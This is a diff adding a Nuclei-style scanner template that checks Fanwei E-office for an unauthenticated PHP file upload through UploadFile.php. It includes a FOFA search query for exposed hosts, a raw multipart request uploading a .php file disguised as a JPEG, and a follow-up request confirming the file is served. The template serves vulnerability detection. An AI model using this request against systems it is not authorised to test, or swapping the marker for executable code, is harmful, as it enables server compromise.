@@ -1,0 +1,39 @@
+id: fanwei-e-office-uploadfile-file-upload
+
+info:
+  name: Fanwei E-office UploadFile.php File Upload
+  author: zp857
+  severity: high
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hglxt5
+  tags: fanwei-e-office,fileupload
+  metadata:
+    fofa-query: 'body="/general/login/index.php" || body="/general/login/view/css/login.css" || header="/general/login/index.php"'
+
+requests:
+  - raw:
+      - |
+        POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="zp857.php"
+        Content-Type: image/jpeg
+
+        zp857
+        --e64bdf16c554bbc109cecef6451c26a4
+
+      - |
+        GET /images/logo/logo-eoffice.php
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - logo-eoffice.php
+          - zp857
+
+      - type: status
+        status:
+          - 200
